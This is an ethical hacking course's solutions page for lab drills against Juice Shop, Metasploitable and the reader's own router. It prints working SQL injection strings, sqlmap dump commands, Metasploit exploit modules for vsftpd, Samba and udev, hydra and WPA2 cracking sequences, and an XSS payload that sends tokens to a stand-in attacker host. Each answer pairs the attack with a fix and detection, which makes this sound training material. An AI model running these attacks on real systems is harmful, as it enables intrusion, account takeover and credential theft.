# Ethical Hacking — Practice Exercises: Solutions

**Worked answers to every drill in [[cybersecurity/02-ethical-hacking/12-practice-exercises|lesson 12]].** Attempt each one yourself first — reading the solution before you've tried defeats the goal-only format. Web answers assume **Juice Shop** on `localhost:3000`; network answers assume **Metasploitable** (or your VPS) from [[cybersecurity/02-ethical-hacking/05-home-lab-setup|lesson 05]]; cracking and wireless answers use files, a database and a router **you own**. Each answer ends with the **fix and detection** — that's the senior half.

## Reconnaissance and scanning
<!-- bite: 67752c20-8141-4988-b76e-561e13d297d4 -->

**1. Juice Shop attack surface from the browser.**
Open dev tools (F12) → Network tab, click around. You'll see the stack (Angular front end, Node/Express back end) from the bundles and headers, and API calls under `/rest/...` and `/api/...`. `curl -s http://localhost:3000/robots.txt` hints at `/ftp`; `ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt` surfaces the `/ftp` directory and other paths. **Surface:** `/rest/user/login`, `/rest/products/search`, `/rest/basket/{id}`, `/ftp`, plus the product/review endpoints.
*Fix/detect:* this is enumeration, not a bug — but the lesson is that the real surface is the **API**, not the UI, so that's what later drills target.

**2. Full host port + service scan.**
```bash
nmap -sV -sC -p- -T4 <host-ip>
```
`-p-` covers all 65535 ports (the default top-1000 misses several of Metasploitable's planted services), `-sV` grabs versions, `-sC` runs default scripts. On Metasploitable expect ~20 ports: ftp (21), ssh (22), telnet (23), smtp (25), http (80), samba (139/445), mysql (3306), postgresql (5432), and more. **Flag** the database ports and telnet as "shouldn't be exposed."

**3. Identify a named CVE.**
```bash
searchsploit vsftpd 2.3.4
```
`vsftpd 2.3.4` is the canonical answer — **CVE-2011-2523**, a backdoor where a `:)` in the username opens a shell on port 6200. `searchsploit samba 3.0.20` also finds the Samba usermap bug. *Detect (defender's view):* a version banner is a shopping list — keeping software patched removes the match.

## Web exploitation — Juice Shop
<!-- bite: 40d821ae-736b-4617-9a5f-984f358b3fcf -->

**4. Admin login without a password.**
In the login **email** field: `' OR 1=1--` (any password). The login query glues the email into SQL; your input closes the string, `OR 1=1` is always true, and `--` comments out the password check, so it returns the first user — the administrator — and logs you in.
*Why it worked:* input became SQL syntax. *Fix:* parameterise the login query (bind the email as data). *Detect:* alert on `' OR`, `--`, `UNION SELECT` in a login body.

**5. Search SQL injection, by hand.**
The search endpoint `GET /rest/products/search?q=` is injectable. A quote in `q` breaks the query (visible error); a `UNION SELECT` with the right column count returns rows from another table (the users table, exposing emails and password hashes) in the JSON response. Find the column count by growing the `UNION SELECT` until it stops erroring, then select the columns you want.
*Fix:* parameterised queries. *Detect:* `UNION SELECT` / SQL metacharacters in the `q` parameter.

**6. Broken access control (IDOR) on a basket.**
Log in as a normal user, open your basket — Burp shows `GET /rest/basket/1`. Send it to Repeater, change `1` to `2`, resend: you get another user's basket, because the app checked you were logged in but never that the basket was *yours*.
*Fix:* check ownership server-side on every request (the basket's user must equal the session user). *Detect:* one user accessing a spread of basket ids → [[cybersecurity/14-api-security/03-authorization-and-bola|BOLA]].

**7. XSS beyond alert().**
Juice Shop's search reflects the term into the DOM; a payload like `<iframe src="javascript:alert(1)">` executes. Beyond `alert()`, a real payload would read `document.cookie`/the auth token and send it to an attacker server (`<iframe src="javascript:fetch('//attacker/steal?c='+localStorage.token)">`), hijacking the victim's session without their password.
*Fix:* output-encode the reflected value (Angular does by default unless bypassed). *Detect:* `<iframe`, `javascript:`, `onerror=` in request/stored fields.

**8. Automate the search injection with sqlmap.**
```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=1" --batch --dbs
sqlmap -u "http://localhost:3000/rest/products/search?q=1" --tables
sqlmap -u "http://localhost:3000/rest/products/search?q=1" -T Users --dump
```
If the endpoint needs a token, pass it with `--headers="Authorization: Bearer <token>"`. `--dbs → --tables → --dump` is the escalating-detail sequence, pulling far more than you did by hand. *Always confirm sqlmap's hits by hand* — it over-reports.

## Network exploitation — host target
<!-- bite: fee77015-5a36-48d1-a6c2-ade1104f1cb4 -->

**9. Remote shell via a framework.**
```text
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <host-ip>
run
```
Lands a shell as **root** directly (the backdoor spawns the shell with root privileges). *Fix:* never run backdoored/outdated software — upgrade vsftpd. *Detect:* a connection to port 6200, or the `:)` username pattern in FTP logs.

**10. Privilege level and escalation.**
```bash
id
```
From `vsftpd_234_backdoor` you're already `uid=0(root)` — done. If you came in via `distcc_exec` (lands as `daemon`), escalate with the known local kernel bug:
```text
use exploit/linux/local/udev_netlink
set SESSION <id>
run
```
CVE-2009-1185 — a missing privilege check in udev on this VM's old kernel. *Fix:* patch the kernel. *Detect:* unexpected setuid/root processes.

**11. A second, independent shell.**
```text
use exploit/multi/samba/usermap_script
set RHOSTS <host-ip>
run
```
CVE-2007-2447, Samba "username map script" command injection — also lands root. A third option, `exploit/unix/misc/distcc_exec` (CVE-2004-2687), lands as `daemon` and needs the privesc above. *Fix:* patch/disable the vulnerable service.

## Password and offline cracking — your own files
<!-- bite: 47e381f0-c059-4107-ad0b-3322e8d3d490 -->

**12. Crack hashes from your dummy database.**
Seed a few dummy users with hashes you made (e.g. `openssl passwd -1` for MD5-crypt, plus one long-random). Then:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```
Identify the format from the hash prefix (`$1$` = MD5-crypt, `$6$` = SHA-512-crypt) so John picks the right mode. The weak ones fall fast; the long-random one doesn't. *Fix:* store passwords with a slow, salted hash (argon2/bcrypt) → [[cybersecurity/05-cryptography/03-hashing-and-integrity|hashing]].

**13. Lock and crack a PDF you made.**
```bash
qpdf --encrypt hunter2 hunter2 256 -- in.pdf locked.pdf
pdf2john locked.pdf > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt && john --show hash.txt
```
`hunter2` (in rockyou) falls in seconds *despite AES-256* — the password, not the algorithm, was weak. Re-lock with `qpdf --encrypt "$(openssl rand -base64 18)" ...` and the same crack never finishes. *Fix:* AES-256 **and** a long random passphrase → [[cybersecurity/02-ethical-hacking/10-pdf-and-document-security|lesson 10]].

**14. Live login via a wordlist.**
Against a host service accepting network logins (e.g. Metasploitable's SSH with the default `msfadmin`):
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<host-ip>
```
`rockyou` finds `msfadmin` quickly (a documented default). *Fix:* no default creds, rate-limit/lock accounts, key-based SSH. *Detect:* many failed logins then a success (credential stuffing).

## Wireless — your own network
<!-- bite: 30f3c3d4-3c4e-413d-9aa7-2eba9014c4ab -->

**15. Capture and crack a WPA2 handshake (your router).**
```bash
airmon-ng start wlan0
airodump-ng -c <channel> --bssid <your-bssid> -w capture wlan0mon
aireplay-ng --deauth 5 -a <your-bssid> wlan0mon        # force one of YOUR devices to reconnect
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <your-bssid> capture-01.cap
```
The deauth forces a reconnect, which produces the 4-way handshake frames to capture. With a weak passphrase (set temporarily) it cracks; restore your real passphrase after. *Fix:* long random passphrase, or WPA3.

**16. Check for WPS.**
```bash
wash -i wlan0mon
```
If your AP shows WPS enabled, that's a "yes" — its 8-digit PIN is validated in two short halves, brute-forceable in hours (`reaver`) or instantly via Pixie Dust, **regardless of passphrase strength**. *Fix:* disable WPS on any router you administer.

## Reporting
<!-- bite: e6abdc7e-62a4-4bec-901a-80ddc7537468 -->

**17. Write-up.**
Structure each finding the way [[cybersecurity/02-ethical-hacking/09-post-exploitation-and-reporting|lesson 09]] describes — title, description, steps to reproduce, evidence, impact, remediation, **and detection** — ranked by severity. For example, "Finding 1 — Authentication bypass via SQL injection in login (CRITICAL): `' OR 1=1--` logs in as admin → all accounts. Fix: parameterise the query. Detect: no alert fired on SQL metacharacters in the login body (second finding)." A report that's just a command transcript fails the exercise-17 bar: *someone who wasn't in the room must be able to read it, reproduce each finding, understand why it matters, and apply the fix.* See the full worked finding in [[cybersecurity/02-ethical-hacking/09-post-exploitation-and-reporting|lesson 09]].

## Related
<!-- bite: a209622f-2835-4c03-b077-3b346c1a8839 -->

- [[cybersecurity/02-ethical-hacking/12-practice-exercises|Practice exercises]] — the drills these answer.
- [[cybersecurity/02-ethical-hacking/07-exploitation-concepts|Exploitation concepts]] and [[cybersecurity/02-ethical-hacking/09-post-exploitation-and-reporting|reporting]] — the concepts behind each answer.

## About this page
<!-- bite: f42e884c-0a3e-4a1f-8108-7d04001352ef -->

**Level:** Intermediate. **What this is:** worked, step-by-step solutions to [[cybersecurity/02-ethical-hacking/12-practice-exercises|lesson 12]]'s drills, each closed with a fix and a detection. Web answers target Juice Shop; network answers target Metasploitable/your VPS; cracking and wireless target your own files, database and router. **Where it sits:** lesson 13 of the [[cybersecurity/02-ethical-hacking/index|Ethical Hacking]] section. Retargeted from the original DVWA/Metasploitable solutions to the Juice Shop + optional-host lab. `[reference]` — not drawn from a personal paid engagement.
